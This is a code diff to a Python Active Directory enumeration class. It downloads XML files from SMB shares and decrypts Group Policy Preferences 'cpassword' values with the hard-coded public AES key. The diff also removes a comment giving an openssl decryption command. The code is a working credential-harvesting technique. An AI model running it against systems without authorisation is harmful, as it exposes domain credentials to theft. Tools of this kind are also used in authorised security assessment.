@@ -270,15 +270,13 @@ class EnumAD():
                     except (SessionError, UnicodeEncodeError, NetBIOSError) as e:
                         continue
                 
-                # Decrypt:
-                # base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000
                 cpassRE = re.compile(r'cpassword=\"([a-zA-Z0-9/]+)\"')
                 #cpassRE = re.compile(r'Version=([a-zA-Z0-9]+)')
                 cipher = AES.new(bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b'), AES.MODE_CBC, '\x00' * 16)
                 # Since the first entry is the DC we dont want that
                 for item in paths[1:]:
-                    if '.' in item.split('\\')[-1]:
-                    #if '.xml' in item.split('\\')[-1]:
+                    #if '.' in item.split('\\')[-1]:
+                    if '.xml' in item.split('\\')[-1]:
                         with open('file-content-{0}-{1}.log'.format(item.split('\\')[-2], item.split('\\')[-1]), 'wb') as f:
                             smbconn.getFile(str(share['shi1_netname']).rstrip('\0'), item, f.write)             
                         with open('file-content-{0}-{1}.log'.format(item.split('\\')[-2], item.split('\\')[-1]), 'r') as f:
